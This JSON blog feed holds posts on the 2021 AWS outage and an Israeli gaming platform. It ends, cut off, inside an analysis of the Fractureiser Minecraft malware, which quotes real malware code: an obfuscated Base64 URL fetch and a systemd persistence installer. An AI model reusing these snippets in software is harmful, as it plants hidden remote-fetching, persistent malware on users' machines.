{
    "version": "https://jsonfeed.org/version/1",
    "title": "DF Blogs",
    "description": "",
    "home_page_url": "https://blog.thefourcraft.com",
    "feed_url": "https://blog.thefourcraft.com/feed.json",
    "user_comment": "",
    "author": {
        "name": "thefourCraft"
    },
    "items": [
        {
            "id": "https://blog.thefourcraft.com/when-the-clouds-darkened-unpacking-the-aws-us-east-1-outage/index.html",
            "url": "https://blog.thefourcraft.com/when-the-clouds-darkened-unpacking-the-aws-us-east-1-outage/index.html",
            "title": "When the Clouds Darkened - Unpacking the AWS US-East-1 Outage",
            "summary": "<p>On December 7, 2021, the digital world experienced a significant disruption. Amazon Web Services (AWS), one of the world's most extensive cloud service providers, faced a substantial outage in its US-East-1 region. The impact was far-reaching, affecting numerous online services and applications, from popular streaming platforms to everyday services.</p>\n",
            "content_html": "<p>On December 7, 2021, the digital world experienced a significant disruption. Amazon Web Services (AWS), one of the world's most extensive cloud service providers, faced a substantial outage in its US-East-1 region. The impact was far-reaching, affecting numerous online services and applications, from popular streaming platforms to everyday services.</p>\n\n<div class=\"flex-1 overflow-hidden\">\n<div class=\"react-scroll-to-bottom--css-jramy-79elbk h-full dark:bg-gray-800\">\n<div class=\"react-scroll-to-bottom--css-jramy-1n7m0yu\">\n<div class=\"flex flex-col text-sm dark:bg-gray-800\">\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<h2>The Outage Begins</h2>\n<p>The day they started like any other Tuesday. However, at approximately 10:30 AM Eastern Time, things began to go awry in Amazon's North Virginia region, known as \"us-east-1\". Over the next three minutes, several regional AWS services started experiencing issues. This wasn't a complete outage for all these services. Still, their functionality was significantly impaired, causing a ripple effect that disrupted the operations of many businesses and services relying on AWS.</p>\n<p>The services affected included the Management console, Route 53, API Gateway, EventBridge, Amazon Connect, and EC2. The outage affected all availability zones in us-east-1 and disrupted a number of global services that are homed in this region. This included AWS Account root logins, Single Sign-On (SSO), and the Security Token Service (STS).</p>\n<h2>Event Timeline </h2>\n<ul>\n<li>\n<p><strong>7:30 AM PST</strong>: An automated activity to scale capacity of one of the AWS services triggered an unexpected behavior, resulting in a significant surge of connection activity that overwhelmed the networking devices between the internal network and the leading AWS network. This caused delays in communication between these networks, leading to increased latency and errors.</p>\n</li>\n<li>\n<p><strong>9:28 AM PST</strong>: AWS teams completed work on moving the internal DNS traffic away from the congested network paths, which resulted in the complete recovery of DNS resolution errors. This improved the availability of several impacted services by reducing the load on the impacted networking devices but did not fully resolve the AWS service impact or eliminate the congestion.</p>\n</li>\n<li>\n<p><strong>1:34 PM PST</strong>: Congestion significantly improved as the operations teams applied remediation actions.</p>\n</li>\n<li>\n<p><strong>2:22 PM PST</strong>: All network devices fully recovered. However, full recovery for Amazon Secure Token Service (STS) occurred at 4:28 PM PST.</p>\n</li>\n<li>\n<p><strong>4:37 PM PST</strong>: API Gateway largely recovered, but customers may have continued to experience low errors and throttling for several hours as API Gateways fully stabilized.</p>\n</li>\n<li>\n<p><strong>5:00 PM PST</strong>: Fargate API error rates began returning to normal.</p>\n</li>\n<li>\n<p><strong>6:40 PM PST</strong>: EventBridge experienced high event delivery latency until this time as it processed the backlog of events.</p>\n</li>\n</ul>\n<h2>The Impact</h2>\n<p>The impact of the outage was broad and far-reaching. It caused various problems for services like Netflix, Disney Plus, Roomba, Ticketmaster, and the Wall Street Journal. It also affected many Amazon services, including Prime Music, Ring doorbells, logistics apps in their fulfillment centers, and some parts of the Amazon.com shopping site.</p>\n<p>The outage highlighted the interconnectedness of digital services and the potential domino effect that can occur when a primary cloud service provider experiences issues. It was a stark reminder of the potential risks of relying heavily on a single cloud service provider.</p>\n<h2>The Root Cause</h2>\n<p>After the dust settled, AWS provided a detailed explanation of what had caused the outage. The root cause was an unexpected behavior triggered by an automated system trying to scale up an internal service running on AWS's private internal network. This led to a significant surge of connection activity that overwhelmed the networking devices between the internal network and the leading AWS network, resulting in delays in communication between these networks.</p>\n<p>These delays increased latency and errors for services communicating between these networks, leading to persistent congestion and performance issues on the devices connecting the two networks. This congestion immediately impacted the availability of real-time monitoring data for AWS's internal operations teams, which impaired their ability to find and resolve the source of congestion.</p>\n<h2>The Aftermath and Lessons Learned</h2>\n<p>The outage had a significant impact on AWS's reputation. However, it also provided valuable lessons for AWS and its users. AWS has since taken several actions to prevent a recurrence of this event. They have turned off the scaling activities that triggered the event and are working on fixing a latent issue that prevented their systems from adequately backing off during the event.</p>\n<p>This incident serves as a reminder of the importance of designing robust and resilient systems. It also underscores the need for effective communication during operational issues. AWS has acknowledged the need to improve customer communication during such events and is planning significant upgrades.</p>\n<h2>Looking Forward</h2>\n<p>While the AWS outage was a significant event that caused widespread disruption, it also provided valuable lessons. It highlighted the importance of resilience in system design and the need for effective communication during operational issues. As AWS continues to learn from this event and improve its systems, users can also take this opportunity to evaluate their systems and consider how they can enhance their resilience to such events in the future.</p>\n<p>In the world of cloud computing, outages are inevitable. However, they can be mitigated through robust system design, effective communication, and continuous learning from past incidents. The December 2021 AWS outage was a stark reminder of this reality. As we progress, cloud service providers and users must take these lessons to heart, continually striving to improve system resilience and response strategies.</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"absolute bottom-0 left-0 w-full border-t md:border-t-0 dark:border-white/20 md:border-transparent md:dark:border-transparent md:bg-vert-light-gradient bg-white dark:bg-gray-800 md:!bg-transparent dark:md:bg-vert-dark-gradient pt-2 md:pl-2 md:w-[calc(100%-.5rem)]\"><form class=\"stretch mx-2 flex flex-row gap-3 last:mb-2 md:mx-4 md:last:mb-6 lg:mx-auto lg:max-w-2xl xl:max-w-3xl\">\n<div class=\"relative flex h-full flex-1 items-stretch md:flex-col\" role=\"presentation\">\n<div class=\"\">\n<div class=\"h-full flex ml-1 md:w-full md:m-auto md:mb-2 gap-0 md:gap-2 justify-center\"> </div>\n</div>\n</div>\n</form></div>",
            "image": "https://blog.thefourcraft.com/media/posts/56/When-the-Clouds-Darkened-Unpacking-the-AWS-US-East-1-Outage.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "Documentary",
                   "DevOps",
                   "AWS"
            ],
            "date_published": "2023-07-05T15:44:13+03:00",
            "date_modified": "2023-07-08T13:26:17+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/how-dose-gaming-israel-work/index.html",
            "url": "https://blog.thefourcraft.com/how-dose-gaming-israel-work/index.html",
            "title": "How Does גיימינג.ישראל Work?",
            "summary": "<p>Embark on a gaming revolution in Israel as I unveil how I built a cutting-edge platform revolutionizing gaming in Israel!</p>\n",
            "content_html": "<p>Embark on a gaming revolution in Israel as I unveil how I built a cutting-edge platform revolutionizing gaming in Israel!</p>\n\n<h2>About IMS - Network's infrastructure</h2>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>As the CTO at <a href=\"https://ims-network.org\" target=\"_blank\" rel=\"sponsored noopener noreferrer\">IMS - Network</a>, I have spearheaded implementing a robust hybrid multi-cloud solution for our applications and services. Our infrastructure strategy combines utilizing major cloud providers with managing two physical server farms in Israel. By adopting this approach, our primary objective is to optimize costs and achieve cost savings. We evaluate the most cost-effective options for each application or platform we develop or host. This approach allows us to leverage the advantages of cloud services while maintaining control over specific resources, ensuring flexibility, reliability, and cost efficiency for our organization.</p>\n<h2>Why Did I Choose AWS For This Platform</h2>\n<p>When I initially started developing \"גיימינג.ישראל,\" it was a simple Docker application running on my local PC. Initially, I built the platform from scratch using the <a href=\"https://Frappeframework.com\" target=\"_blank\" rel=\"noopener noreferrer\">Frappe framework</a>. While Frappe is a fantastic framework to work with, I soon realized that this approach would be time-consuming and require significant effort. After two months of development, I decided to transition to <a href=\"https://WordPress.org\" target=\"_blank\" rel=\"noopener noreferrer\">WordPress</a>. WordPress is a well-known platform with extensive documentation, an active community, and a robust foundation.</p>\n<p>The shift to AWS came when we at IMS - Network began migrating applications from our self-hosted servers to the cloud. The primary goal was to free up space on our servers to accommodate gaming servers, as low ping is a critical factor for gamers. <br>We recognized that AWS offered a comprehensive suite of services, scalability, reliability, and the ability to optimize costs. </p>\n<p>Ultimately, the choice to utilize AWS for \"גיימינג.ישראל\" was driven by the need for a scalable and reliable platform, and the desire to streamline development efforts.</p>\n<h2>Infrastructure Setup</h2>\n<p>Our infrastructure consists of several vital services within the AWS environment. Here are details about the services we utilize:</p>\n<figure class=\"post__image\" ><figure class=\"post__image post__image--wide\"><img loading=\"lazy\"  src=\"https://blog.thefourcraft.com/media/posts/55/Gaming-Israel-Wordpress-Network-1.png\" alt=\"Cloudcraft 3D diagram of the infrastructure\" width=\"3840\" height=\"2160\" sizes=\"(max-width: 48em) 100vw, 768px\" srcset=\"https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-xs.png 300w ,https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-sm.png 480w ,https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-md.png 768w\"></figure>\n<figcaption >Cloudcraft 3D diagram of the infrastructure</figcaption>\n</figure>\n<h3>EC2 – Automatic Scaling and System Operations</h3>\n<p>Our system operates on two EC2 instances that host our platform. With the automatic scaling feature of EC2, we can dynamically adjust our resources in response to changes in system load. This capability allows us to efficiently handle varying workloads and maintain optimal availability and performance for our users.</p>\n<p>When the demand for our system increases, EC2 automatically scales up our resources by adding more instances to handle the workload effectively. Likewise, during periods of lower demand, EC2 scales down our resources by removing instances, optimizing cost efficiency.</p>\n<h3>S3 – Daily Image Backup</h3>\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>We have implemented the S3 (Simple Storage Service) as our backup solution to safeguard our valuable images. Through S3, we store and protect our images in a secure and easily accessible manner. This approach ensures that our images are reliably backed up and can be swiftly recovered in the event of data loss or system failure. By leveraging S3's durability and redundancy features, we maintain the integrity of our image data, guaranteeing that important visual content is preserved and readily available whenever needed.</p>\n</div>\n</div>\n</div>\n<h3>SES – Email Delivery</h3>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>To streamline communication within our system, we rely on the SES (Simple Email Service) provided by Amazon for efficient email delivery. By leveraging SES, we can automate the process of sending emails and notifications to users within our system. This service serves as a reliable and swift communication channel, enabling us to effectively deliver important information and timely updates to our users. With SES, we ensure that our users receive essential messages promptly and dependably, facilitating seamless and effective communication throughout our platform.</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3>API Gateway and Custom API</h3>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>We have integrated the API Gateway service into our infrastructure to effectively manage both the WordPress API and our unique platform API. API Gateway is vital in securely handling communication with the APIs, ensuring easy administration and maintenance. This service provides a centralized control point for our APIs, allowing us to manage access, authentication, and rate limiting efficiently. Moreover, API Gateway empowers us to develop external applications that can seamlessly interact with our system through the custom API, fostering integrations and extending the functionality of our platform.</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3>RDS and MySQL Database</h3>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>Within our infrastructure, we have integrated the RDS (Relational Database Service) offered by AWS, with MySQL serving as the primary database for our WordPress-based system. By utilizing RDS, we benefit from a fully managed database solution, enabling us to dedicate our resources to developing and maintaining our application without concern with setting up central server infrastructures or managing the database locally. RDS provides a reliable and scalable foundation for our database needs, ensuring optimal performance and streamlined management.</p>\n<h3>EOF</h3>\n<p>In general, the combination of AWS infrastructure and WordPress allowed me to build גיימינג.ישראל and make it work :)  </p>\n<h4>Why won't you go multi-region in case Frankfurt won't be available?</h4>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>Well, here's a light-hearted response with a DevOps joke:</p>\n<p>\"Why won't you go multi-region in case Frankfurt won't be available? Because our budget is more single-region than multi-million!\"</p>\n<p>In the world of DevOps, multi-region setups are often considered the gold standard for high availability and disaster recovery. However, implementing such a setup can be costly and resource-intensive. So, while the idea of going multi-region might be appealing, sometimes the budget constraints make it a challenging endeavor. But hey, we can always dream of a day when our pockets are as vast as our infrastructure!</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://blog.thefourcraft.com/media/posts/55/How-Does-gyymyng-yshrl-Work.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "גיימינג.ישראל",
                   "Servers",
                   "IMS - Network",
                   "Gaming",
                   "AWS"
            ],
            "date_published": "2023-07-01T20:44:23+03:00",
            "date_modified": "2023-07-01T23:54:16+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/i-created-ultimate-hub-for-gaming-in-israel/index.html",
            "url": "https://blog.thefourcraft.com/i-created-ultimate-hub-for-gaming-in-israel/index.html",
            "title": "I Created Ultimate Hub for Gaming In Israel",
            "summary": "<p>Welcome to <a href=\"https://גיימינג.ישראל\" target=\"_blank\" rel=\"sponsored noopener noreferrer\">גיימינג.ישראל</a>, the premier gaming center and marketplace for gamers in Israel. Join diverse communities, find assistance for your projects, and share your creations with fellow gamers. Let's unite and embrace the world of gaming together!</p>\n",
            "content_html": "<p>Welcome to <a href=\"https://גיימינג.ישראל\" target=\"_blank\" rel=\"sponsored noopener noreferrer\">גיימינג.ישראל</a>, the premier gaming center and marketplace for gamers in Israel. Join diverse communities, find assistance for your projects, and share your creations with fellow gamers. Let's unite and embrace the world of gaming together!</p>\n\n<h2>Discover a Thriving Gaming Community</h2>\n<p>At <a href=\"https://גיימינג.ישראל\" target=\"_blank\" rel=\"sponsored noopener noreferrer\">גיימינג.ישראל</a>, we believe in the power of community.<br>Connect with like-minded gamers, engage in lively discussions, and exchange valuable insights. My platform fosters a vibrant and inclusive space where gamers of all backgrounds come together to celebrate their passion for gaming.</p>\n<h2>List Your Gaming Servers and More</h2>\n<p>Are you looking to showcase your multiplayer game? Look no further. <a href=\"https://גיימינג.ישראל\" target=\"_blank\" rel=\"sponsored noopener noreferrer\">גיימינג.ישראל</a> provides a comprehensive platform for users to list their gaming servers and attract fellow gamers. Whether you're a developer, a community leader, or a gaming enthusiast, my platform offers the ideal avenue to reach your target audience and build a thriving gaming community.</p>\n<h2>Hold On... How's The Domain Name In Hebrew!?</h2>\n<p>The new Country Code top-level domain (ccTLD) .ישראל has launched! On November 22, 2022, the Israel Internet Association (ISOC-IL) started offering the public the option to register Hebrew domain names under a new national TLD – .ישראל. Now, Israelis have two available TLDs: ישראל and .il.</p>\n<p>Notably, while the ability to register a .ישראל domain is exciting, it's important to note that not all web apps and online services may support it initially. ISOC-IL is actively working to expand the support for the new TLD in various apps and platforms. Still, this process will take time due to the many browsers, messaging apps, online services, and email apps available.</p>\n<h3>How do non-Latin domain names work?</h3>\n<p>Domain names in Hebrew (and other languages) utilize a set of standards called IDN (Internationalized Domain Names). Hebrew domain names are translated into strings containing Latin letters, numbers, and hyphens, decoded by the domain name system (DNS). For example, the domain name \"גיימינג.ישראל\" is represented as \"xn--6dbauaa3ap.xn--4dbrk0ce\". While many browsers already support IDN standards, email software, and other applications still adopt them.</p>\n<h3>Wait... How Did You Manage To Acquire The Domain Name \"gaming.Israel\"</h3>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\"> </div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>You may have noticed that \"גיימינג.ישראל\" translates to \"gaming.Israel,\" which is a precious domain, similar to domains like gaming.com or apple.com. Acquiring such a domain requires registering during the sunrise period:</p>\n<h4>What is the sunrise period for a new gTLD?</h4>\n<p>When a new gTLD is launched, a <strong>sunrise period of at least 30 days is required before domain names are offered to the general public</strong> During the Sunrise period, you can register a domain name for 1 to 10 years, depending on the registry rules</p>\n<h4>So How Did I Buy \"גיימינג.ישראל\"</h4>\n<p>During the sunrise period, many large enterprises typically reserve their domains. However, individuals and organizations also seek unique names to purchase for future use. The same held true for the new gTLD domain, .ישראל.</p>\n<p>When I first heard about the new gTLD, I was eager to acquire \"גיימינג.ישראל\" right from the start. Without hesitation, I promptly approached a verified domain registrar and engaged in a bidding war with one of the prominent telecommunication providers in Israel. After numerous rounds of bidding, I emerged victorious! 😈</p>\n<h2>About The \"גיימינג.ישראל\" Platform</h2>\n<p>The motivation behind creating the \"גיימינג.ישראל\" platform stemmed from a desire to address several challenges faced by the Israeli gaming community. As a player and a gaming community owner, I noticed that the community was fragmented due to the lack of a centralized platform where players could quickly discover and join various gaming communities in Israel.</p>\n<p>Existing server lists in other countries often proved to be complicated to navigate, had poor design, or lacked adequate security measures. Additionally, many Israeli gamers resorted to seeking gaming communities in the US or EU due to the absence of a comprehensive platform in Israel. However, the major obstacle they faced was the issue of high ping, which negatively impacted their gaming experience when playing on servers located far away.</p>\n<p>With the \"גיימינג.ישראל\" platform, I aimed to provide a solution that would address these challenges and unite the Israeli gaming community. Players can easily find and join gaming servers within Israel by offering a user-friendly and secure platform. This enhances the gaming experience and fosters a stronger sense of community among Israeli gamers.</p>\n<p>Through \"גיימינג.ישראל,\" gamers can discover a wide range of local gaming communities, connect with fellow players, and engage in thrilling adventures unique to Israel. By eliminating the ping issue associated with distant servers, the platform enables Israeli gamers to embrace and enjoy gaming experiences within their own country fully.</p>\n<p>The vision behind \"גיימינג.ישראל\" is to create a vibrant and unified gaming ecosystem in Israel, where players can effortlessly explore, connect, and collaborate. Together, we can build a strong and thriving gaming community that showcases the talent and creativity of Israeli gamers to the world. Join us on \"גיימינג.ישראל\" and unlock the full potential of gaming in Israel!</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://blog.thefourcraft.com/media/posts/54/I-Created-Ultimate-Hub-for-Gaming-In-Israel.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "Servers",
                   "IMS - Network",
                   "Gaming",
                   "AWS"
            ],
            "date_published": "2023-07-01T20:43:35+03:00",
            "date_modified": "2023-07-03T10:08:53+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/the-devastating-fractureiser-minecrafts-malware-outbreak/index.html",
            "url": "https://blog.thefourcraft.com/the-devastating-fractureiser-minecrafts-malware-outbreak/index.html",
            "title": "The Devastating Fractureiser: Minecraft&#x27;s Malware Outbreak",
            "summary": "<p>In Minecraft, a new threat has emerged A malware known as the \"Fractureiser\" has been causing havoc, infecting mods and spreading. This blog post aims to shed light on this devastating outbreak, providing an in-depth analysis of the malware, its impact, and the steps taken by the community to combat it.</p>\n",
            "content_html": "<p>In Minecraft, a new threat has emerged A malware known as the \"Fractureiser\" has been causing havoc, infecting mods and spreading. This blog post aims to shed light on this devastating outbreak, providing an in-depth analysis of the malware, its impact, and the steps taken by the community to combat it.</p>\n\n<h2>The Emergence of Fractureiser</h2>\n<p>The Fractureiser malware was first discovered when a Minecraft server hosting company, MCHost.no, was contacted by a customer reporting that his server was not starting correctly. The server would freeze when loading the plugins, a symptom that usually indicates a problem with a faulty or incompatible plugin. However, after several days of back and forth, it was discovered that the issue was much more severe. The customer's plugins were infected with a \"virus\" that he had unknowingly downloaded from a shady <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<p>The malware was traced back to a class file named \"Updater.Class\" found in the infected plugins. The file was encoded and could not be decompiled using standard methods, making it difficult to understand its functionality <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-2\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>. However, further investigation revealed that the malware connected to a host via an encoded URL <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-3\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<h2>The Fractureiser's Modus Operandi</h2>\n<p>The Fractureiser malware operates by infecting Minecraft mods and spreading across servers. It uses a class file named \"Updater.Class\" to infect plugins and then connects to a host via an encoded URL <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-4\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>. The malware also sets itself up for continued access, making it challenging to remove <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-5\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<p>The malware was found to be particularly dangerous as it could spread across servers. However, due to the use of Docker containers for hosting Minecraft servers on MCHost.no, each server was isolated, preventing the malware from spreading between servers <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-6\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<h2>The Community's Response</h2>\n<p>The Minecraft community has taken several steps to combat the Fractureiser malware in response to the outbreak. A detection tool was developed to help users identify if their computer has been infected <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. The tool checks if the user's system is infected and lists the detected files <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-2\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. If an infection is found, the user is advised to delete the infected files and run independent malware scanning tools <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-3\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>.</p>\n<p>In addition to the detection tool, a scanning tool was also developed to detect any dormant or other infected mods/Jar files <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-4\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. This tool scans for stage 0 vulnerability and can detect any infected Jars <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-5\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>.</p>\n<h2>The Impact of the Fractureiser Malware</h2>\n<p>The impact of the Fractureiser malware has been significant, with several mods being infected and taken down permanently <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-6\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. The malware has also infected several Bukkit plugins <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-7\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. At the time of detection, the total non-unique downloads for some of the infected mods and plugins were in the hundreds, indicating the widespread nature of the infection <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-8\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>.</p>\n<p>The following code snippets are from the Fractureiser malware and provide insight into how it operates:</p>\n<p>This snippet shows how the malware connects to a host via an encoded URL:</p>\n<pre><code>HttpURLConnection var2 = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode(\"aHR0cDovL2ZpbGVzLnNreXJhZ2UuZGUvdXBkYXRl\")))).openConnection();</code></pre>\n<p>The malware connects to a host using an encoded URL. The URL is decoded from Base64 format and then used to open a connection. This method allows the malware to hide the URL it connects to, making it harder for security systems to detect and block it.</p>\n<p>This snippet shows how the malware sets itself up for continued access:</p>\n<pre>var0 = new File(\"/bin/vmd-gnu\");<br>File var1 = new File(\"/etc/systemd/system/vmd-gnu.service\");<br>String var2 = \"[Unit]\\\\nDescription=vmd-gnu local service\\\\nAfter=network.target\\\\nStartLimitIntervalSec=0\\\\n\\\\n[Service]\\\\nType=simple\\\\nRestart=always\\\\nRestartSec=1\\\\nUser=\" + System.getProperty(\"user.name\") + \"\\\\nExecStart=/bin/sh -c \\\\\\\"java -Dauto=true -jar /bin/vmd-gnu\\\\\\\"\\\\n\\\\n[Install]\\\\nWantedBy=multi-user.target\";<br>URL var3 = O.class.getProtectionDomain().getCodeSource().getLocation();<br>Files.copy((new File(var3.getFile())).toPath(), var0.toPath(), StandardCopyOption.REPLACE_EXISTING);<br>Files.write(var1.toPath(), var2.getBytes(), new OpenOption[0]);<br>Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"systemctl enable vmd-gnu\"}).waitFor();<br>Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"systemctl start vmd-gnu\"}).waitFor();</pre>\n<p>The malware 